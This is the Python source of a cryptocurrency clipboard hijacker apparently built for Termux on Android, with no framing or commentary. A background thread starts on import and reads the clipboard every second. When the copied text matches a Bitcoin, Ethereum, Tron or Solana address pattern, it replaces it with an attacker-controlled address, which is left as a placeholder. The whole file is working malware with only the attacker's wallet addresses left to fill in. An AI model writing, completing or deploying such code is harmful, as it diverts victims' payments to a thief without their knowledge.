import os, re, time, subprocess, hashlib, threading

DID = hashlib.md5((os.uname().nodename + str(__import__("uuid").getnode())).encode()).hexdigest()[:16]
POLL_INTERVAL = 1

WALLETS = {
    "btc": "REPLACE_BTC_ADDRESS",
    "eth": "REPLACE_ETH_ADDRESS",
    "trx": "REPLACE_TRX_ADDRESS",
    "sol": "REPLACE_SOL_ADDRESS"
}

PATTERNS = {
    "btc": re.compile(r"\b(bc1[a-z0-9]{25,62}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b"),
    "eth": re.compile(r"\b0x[a-fA-F0-9]{40}\b"),
    "trx": re.compile(r"\bT[a-zA-Z0-9]{33}\b"),
    "sol": re.compile(r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b")
}


def _get():
    try:
        r = subprocess.run(["termux-clipboard-get"], capture_output=True, timeout=5)
        return r.stdout.decode("utf-8", "ignore").strip()
    except Exception:
        return ""


def _set(v):
    try:
        subprocess.run(["termux-clipboard-set", v], capture_output=True, timeout=5)
        return True
    except Exception:
        return False


def _loop():
    while True:
        try:
            cur = _get()
            if cur:
                for chain, pat in PATTERNS.items():
                    if pat.fullmatch(cur.strip()) and WALLETS.get(chain, "").startswith(("1", "3", "b", "0", "T", "R", "9", "A", "B", "C", "D", "E", "F", "G", "H", "J", "K", "L", "M", "N", "P", "Q", "S", "U", "V", "W", "X", "Y", "Z")):
                        if "REPLACE" not in WALLETS[chain]:
                            _set(WALLETS[chain])
                            break
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)


threading.Thread(target=_loop, daemon=True).start()